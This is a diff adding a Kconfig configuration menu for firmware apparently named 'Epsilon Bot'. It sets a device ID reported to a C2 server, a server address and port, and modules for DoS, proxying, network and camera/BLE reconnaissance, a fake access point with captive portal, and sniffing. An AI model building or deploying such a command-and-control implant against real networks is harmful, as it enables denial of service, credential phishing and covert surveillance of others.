@@ -1,0 +1,126 @@
+menu "Epsilon Bot Configuration"
+
+################################################
+# Device
+################################################
+config DEVICE_ID
+    string "Device ID"
+    default "ce4f626b"
+    help
+        Unique device identifier sent to the C2 server.
+
+################################################
+# Core Network
+################################################
+menu "Network"
+
+choice NETWORK_MODE
+    prompt "Connection Mode"
+    default NETWORK_WIFI
+
+config NETWORK_WIFI
+    bool "WiFi"
+
+config NETWORK_GPRS
+    bool "GPRS"
+
+endchoice
+
+menu "WiFi Settings"
+    depends on NETWORK_WIFI
+
+config WIFI_SSID
+    string "WiFi SSID"
+    default "mywifi"
+
+config WIFI_PASS
+    string "WiFi Password"
+    default ""
+
+endmenu
+
+menu "GPRS Settings"
+    depends on NETWORK_GPRS
+
+config GPRS_APN
+    string "APN"
+    default "sl2sfr"
+
+endmenu
+
+endmenu
+
+################################################
+# Server
+################################################
+menu "Server"
+
+config SERVER_IP
+    string "Server IP"
+    default "192.168.1.100"
+
+config SERVER_PORT
+    int "Server Port"
+    default 2626
+    range 1 65535
+
+endmenu
+
+################################################
+# Modules (Command Providers)
+################################################
+menu "Modules"
+
+config MODULE_NETWORK
+    bool "Network Commands"
+    default y
+    help
+        ping, arp_scan, proxy, dos, etc.
+
+config MODULE_RECON
+    bool "Recon Commands"
+    default n
+    depends on NETWORK_WIFI
+    help
+        Network reconnaissance commands.
+
+config MODULE_FAKEAP
+    bool "Fake Access Point Commands"
+    default n
+    help
+        Fake AP, captive portal, sniffer.
+
+endmenu
+
+################################################
+# Recon Module Settings
+################################################
+menu "Recon Settings"
+    depends on MODULE_RECON
+
+config RECON_MODE_CAMERA
+    bool "Enable Camera Reconnaissance"
+    default n
+
+config RECON_MODE_BLE_TRILAT
+    bool "Enable BLE Trilateration Reconnaissance"
+    default n
+
+endmenu
+
+################################################
+# Security
+################################################
+menu "Security"
+
+config CRYPTO_KEY
+    string "ChaCha20 Key (32 bytes)"
+    default "testde32chars00000000000000000000"
+
+config CRYPTO_NONCE
+    string "ChaCha20 Nonce (12 bytes)"
+    default "noncenonceno"
+
+endmenu
+
+endmenu
